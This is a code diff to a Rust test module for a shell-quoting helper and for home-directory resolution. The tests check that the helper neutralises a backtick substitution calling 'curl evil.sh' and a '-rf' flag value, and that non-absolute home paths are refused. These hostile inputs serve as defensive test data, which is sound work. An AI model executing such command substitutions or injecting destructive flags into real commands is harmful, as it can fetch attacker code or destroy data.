@@ -384,6 +384,10 @@ mod tests {
         // Backticks are the other command-substitution syntax POSIX shells
         // honour, and single quotes disable them exactly the same way.
         assert_eq!(shell_quote("`curl evil.sh`"), "'`curl evil.sh`'");
+        // Not exploitable today — nothing in this module puts untrusted data
+        // in flag position — but a quoted value can never be mistaken for a
+        // flag by whatever reads it next, so it belongs on the hostile list.
+        assert_eq!(shell_quote("-rf"), "'-rf'");
     }
 
     #[test]
@@ -436,6 +440,57 @@ mod tests {
                 .count(),
             1,
             "the second call must come from remotes.json"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_tilde_home_is_refused_rather_than_sent_to_root_for() {
+        // This is the R1 mechanism: `paths::root_for` refuses a non-absolute
+        // override rather than defaulting, so a `~` that reached it would
+        // hard-error there instead of silently collapsing every developer on
+        // a shared box into one namespace. `resolve_home` must catch it
+        // first, with an actionable message, rather than caching a `~` that
+        // later commands would carry unexpanded.
+        let home = tempfile::TempDir::new().expect("tempdir");
+        let paths = crate::paths::RealPaths::rooted_at(home.path());
+        let fake = Arc::new(crate::runner::FakeRunner::new().containing("printf", 0, "~\n", ""));
+        let mut store = store::Store::default();
+        store.remotes.push(store::record_for(&remote()));
+
+        let err = resolve_home(&remote(), &paths, fake, &mut store)
+            .await
+            .expect_err("a `~` is not an absolute path");
+        assert!(
+            err.downcast_ref::<Failure>().is_some(),
+            "must be the actionable Failure, not a generic error: {err}"
+        );
+        assert!(
+            store.remotes[0].home.is_empty(),
+            "a refused home must not be cached"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_relative_home_is_refused_rather_than_sent_to_root_for() {
+        // The other shape a non-absolute `$HOME` can take: no leading `/` and
+        // no `~` either, just a bare relative path.
+        let home = tempfile::TempDir::new().expect("tempdir");
+        let paths = crate::paths::RealPaths::rooted_at(home.path());
+        let fake = Arc::new(crate::runner::FakeRunner::new().containing(
+            "printf",
+            0,
+            "relative/path\n",
+            "",
+        ));
+        let mut store = store::Store::default();
+        store.remotes.push(store::record_for(&remote()));
+
+        let err = resolve_home(&remote(), &paths, fake, &mut store)
+            .await
+            .expect_err("a relative path is not an absolute path");
+        assert!(
+            err.downcast_ref::<Failure>().is_some(),
+            "must be the actionable Failure, not a generic error: {err}"
         );
     }
 }
